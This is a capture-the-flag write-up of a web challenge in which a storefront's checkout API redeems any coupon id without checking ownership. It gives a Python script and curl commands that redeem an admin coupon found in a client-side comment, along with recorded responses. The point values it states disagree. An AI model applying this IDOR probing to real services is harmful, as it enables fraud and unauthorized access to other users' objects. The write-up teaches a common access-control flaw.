---
title: "The Discount That Wasn't There"
category: "Web"
tags: ["idor", "broken-access-control", "information-disclosure"]
solve_date: "2026-10-10T20:00:00+07:00"
language: "en"
points: 200
---

# The Discount That Wasn't There

**Flag:** `foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}`
**Service:** `http://54.87.116.237:5003` (Flask + gunicorn, open registration)

| Artifact fetched from the service | Bytes | SHA-256 |
|---|---:|---|
| `/static/app.js` | 782 | `3a4aed11534c640aa4267397c128d8e5a1707f50b82678154dd2ef40d16bcd4c` |

## Challenge

> A fictional e-commerce platform has launched a limited-time sale, offering exclusive discount coupons to registered users. After logging in, you receive your own coupon and are assured that it can only be used by your account.
>
> But what if the server's definition of ownership isn't as secure as it seems?
>
> Somewhere in the application lies an administrator's exclusive coupon, offering a discount far beyond what ordinary users can access. [...]
>
> Hint: Don't trust what the browser tells you about who owns something.

Objective: locate the administrator's coupon and redeem it through checkout to obtain the flag. Card data recorded at solve time: 350 points, Hard, 302 solves.

## Analysis

The application is a minimal storefront. `POST /register` with a username and password returns `302 → /dashboard` and sets:

```text
session=eyJ1c2VyX2lkIjoyNn0.aso2iA.mvgkmQHvGerEeg3Kmu3ImXNEu9s
```

Decoding the payload section gives `{"user_id":26}` — the session carries identity only, no voucher. The JSON API surface is two endpoints, alongside the HTML routes (`/`, `/register`, `/login`, `/dashboard`, `/logout`); paths such as `/admin`, `/coupons`, `/api/coupons`, `/products` and `/flag.txt` return 404.

`GET /api/coupon` (authenticated) returns exactly one coupon, the caller's own:

```json
{"coupon":"USER10","coupon_id":"9fb688bc-b1e1-4425-b09f-d772ea11e9dc","discount":10,"owner_id":26,"username":"danh01"}
```

Two details matter: the server stores the ownership relation (`owner_id`), and the coupon identifier is an RFC-4122 version 4 UUID (version nibble `4` in the third group). A second account's id — `f1b66b3d-81a2-4a56-9a3f-8ad55de2ff75` — confirms coupon ids are generated per account, so guessing them sequentially is not viable. The problem therefore splits in two: find the identifier of the administrator's coupon, and exploit how `/api/checkout` handles whatever id is supplied.

The first half is in the client bundle. `/static/app.js` (header comment `PixelMart storefront bundle (v2.3.1)`) wraps both endpoints and also carries a leftover testing note:

```js
// TODO(dev): remove this before prod — leftover from testing the admin
// override flow against the staging coupon table.
// test case: checkout("8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2")
```

The checkout endpoint contains the authorization flaw. `POST /api/checkout` accepts only `coupon_id`, and its authorization check stops at the authentication layer: a request without a session cookie returns:

```text
401 {"error":"authentication required"}
```

No step compares the coupon against the caller's `user_id`. Direct evidence: injecting ownership fields into the body changes nothing, because the backend never reads them —

```text
{"coupon_id":"8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2","user_id":1,"username":"admin"}
200 {"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
```

The "valid only for your own account" rule lives elsewhere: the UI only renders the coupon that `/api/coupon` returns, while the checkout `coupon_id` input and the `checkout()` helper in `app.js` will send any id. This is BOLA/IDOR on `/api/checkout` — the object is referenced by a user-controlled identifier and the server does not verify ownership.

## Solution

1. `POST /register` with any username and password; keep the `session` cookie from the response.
2. Read `/static/app.js` and take the UUID from the `test case:` comment: `8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2`.
3. `POST /api/checkout` with `Content-Type: application/json` and body `{"coupon_id":"8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2"}`.

The response (HTTP 200):

```text
{"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
```

Redeeming the account's own coupon on the same session only yields a normal receipt, so the flag is not a value that checkout returns in general:

```text
{"coupon_used":"USER10","discount_applied":"10%","receipt":"RCPT-9FB688BC","success":true}
```

The `8f3c4a9e-...` record is static: it produced the identical response for two different accounts (`user_id` 26 and 113) and across five consecutive calls. The server never discloses an `owner_id` for this coupon; attributing it to the administrator rests on the code `ADMIN50`, its 50% discount versus the regular `USER10`/10%, and the role the statement describes.

## Result

The flag was read from the `receipt` field of the `/api/checkout` response from the service:

```text
foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}
```

The application exposes no `/submit` endpoint; no submission response is recorded here.

## Reproduce

Requires Python 3 with `requests` (`pip install requests`). The script below runs the full chain: register → read own coupon → redeem the admin coupon → boundary probes.

```python
import json
import requests

BASE = "http://54.87.116.237:5003"
ADMIN_COUPON = "8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2"

s = requests.Session()
r = s.post(f"{BASE}/register", data={"username": "wuprobe", "password": "wuprobe"},
           allow_redirects=False)
print("[*] register ->", r.status_code, r.headers.get("Location"))
print("[*] session cookie =", s.cookies.get("session"))

r = s.get(f"{BASE}/api/coupon")
print("[*] /api/coupon ->", json.dumps(r.json(), sort_keys=True))

mine = r.json()["coupon_id"]

r = s.post(f"{BASE}/api/checkout", json={"coupon_id": ADMIN_COUPON})
print("[*] admin coupon ->", r.status_code, r.text.strip())

r = s.post(f"{BASE}/api/checkout", json={"coupon_id": mine})
print("[*] own coupon  ->", r.status_code, r.text.strip())

r = s.post(f"{BASE}/api/checkout", json={"coupon_id": "1"})
print("[*] id = 1      ->", r.status_code, r.text.strip())

r = s.post(f"{BASE}/api/checkout",
           json={"coupon_id": ADMIN_COUPON, "user_id": 1, "username": "admin"})
print("[*] forged body ->", r.status_code, r.text.strip())

r = requests.post(f"{BASE}/api/checkout", json={"coupon_id": ADMIN_COUPON})
print("[*] no session  ->", r.status_code, r.text.strip())
```

Recorded output:

```text
[*] register -> 302 /dashboard
[*] session cookie = eyJ1c2VyX2lkIjoxMTN9.asyyvQ.LUf9wQKiS4AqM0A0wJRRdJzmJTI
[*] /api/coupon -> {"coupon": "USER10", "coupon_id": "f1b66b3d-81a2-4a56-9a3f-8ad55de2ff75", "discount": 10, "owner_id": 113, "username": "wuprobe"}
[*] admin coupon -> 200 {"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
[*] own coupon  -> 200 {"coupon_used":"USER10","discount_applied":"10%","receipt":"RCPT-F1B66B3D","success":true}
[*] id = 1      -> 404 {"error":"invalid coupon"}
[*] forged body -> 200 {"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
[*] no session  -> 401 {"error":"authentication required"}
```

Minimal curl version, on Git Bash or PowerShell (`curl.exe`):

```bash
curl -s -c jar.txt -X POST http://54.87.116.237:5003/register \
     -d "username=danh01&password=Test1234" -o /dev/null

curl -s -b jar.txt -H "Content-Type: application/json" \
     -X POST http://54.87.116.237:5003/api/checkout \
     -d '{"coupon_id":"8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2"}'
```

The `coupon_id` of the freshly registered account differs on every run; only the admin UUID is fixed. If the instance no longer holds that record, re-read the comment in `/static/app.js`.
